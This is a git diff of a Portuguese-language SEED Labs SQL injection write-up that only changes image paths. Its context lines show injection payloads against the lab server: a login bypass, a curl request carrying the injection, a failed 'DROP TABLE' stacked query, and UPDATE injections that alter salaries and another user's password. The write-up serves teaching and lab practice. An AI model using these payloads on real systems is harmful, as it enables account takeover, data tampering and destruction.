@@ -27,7 +27,7 @@ SELECT * FROM credentials WHERE Name = "Alice";
 ```
 
 O resultado:
-![Alt text](./images/image8-1.png)
+![Alt text](../images/image8-1.png)
 
 ###  Task 2: 
 
@@ -42,11 +42,11 @@ WHERE name='admin'# and Password=’$hashed_pwd’
 ```
 
 Ou podemos fazer isto na página:
-![Alt text](./images/image8-8.png)
+![Alt text](../images/image8-8.png)
 
 Obtívemos assim os dados do administrador:
 
-![Alt text](./images/image8-2.png)
+![Alt text](../images/image8-2.png)
 
 #### Task 2.2
 
@@ -58,7 +58,7 @@ curl "http://www.seed-server.com/unsafe_home.php?username=admin%27%23&Password="
 
 Obtendo-se assim a página HTML com os dados pessoais dos users:
 
-![Alt text](./images/image8-3.png)
+![Alt text](../images/image8-3.png)
 
 #### Task 2.3
 
@@ -69,7 +69,7 @@ admin'; DROP TABLE IF EXISTS credentials; #
 ```
 A operação não chegou a ser executada devido a um erro:
 
-![Alt text](./images/image8-4.png)
+![Alt text](../images/image8-4.png)
 
 Segundo o [manual](https://www.php.net/manual/en/mysqli.quickstart.multiple-statement.php), a extensão de MySQL utilizada pelo servidor contém uma proteção que impede a execução de múltiplas queries, não sendo possível realizar o ataque.
 
@@ -91,7 +91,7 @@ SSN='10211002',Salary='9999999' WHERE ID=$id;
 
 Conseguímos assim alterar o salário para o valor escolhido:
 
-![Alt text](./images/image8-5.png)
+![Alt text](../images/image8-5.png)
 
 #### Task 3.2
 Para alterar o salário de outra pessoa usámos um código muito semelhante ao anterior:
@@ -105,7 +105,7 @@ Password='$hashed_pwd',
 SSN='10213352',Salary='-9999999' WHERE Name='Boby'# WHERE ID=$id;
 ```
 
-![Alt text](./images/image8-6.png)
+![Alt text](../images/image8-6.png)
 
 #### Task 3.3
 
@@ -123,4 +123,4 @@ SSN='10213352', password='8b386dbd9fd6db15f6f943aa5e1705835b5039a2' WHERE name='
 
 Conseguímos assim entrar na conta:
 
-![Alt text](./images/image8-7.png)
+![Alt text](../images/image8-7.png)
